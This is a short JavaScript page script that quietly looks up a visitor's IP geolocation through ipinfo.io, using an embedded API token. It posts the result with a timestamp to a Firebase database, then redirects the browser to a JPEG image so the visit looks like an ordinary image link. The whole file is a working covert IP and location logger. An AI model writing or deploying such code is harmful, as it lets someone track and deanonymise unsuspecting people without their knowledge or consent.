const getLoc = async () => {
  try {
    const res = await fetch(`https://ipinfo.io?token=3d6a8a86c36369`)
    const json = await res.json()
    return json
  } catch (error) {
    console.log(error)
  }
}

const saveLoc = async () => {
  try {
    const uri = `https://get-location-ce7e5-default-rtdb.europe-west1.firebasedatabase.app/.json`
    const data = await getLoc()

    const date = { date: new Date().toLocaleString() }
    const dataObj = Object.assign(date, data)

    await fetch(uri, {
      method: 'POST',
      body: JSON.stringify(dataObj)
    })
  } catch (error) {
    console.log(error)
  }
}

const main = async () => {
  await getLoc()
  await saveLoc()
  document.location.href="https://etnosoft.com.ua/wp-content/uploads/2020/07/z-dnem-narodgennja-vitalij4.jpg"
}

main()
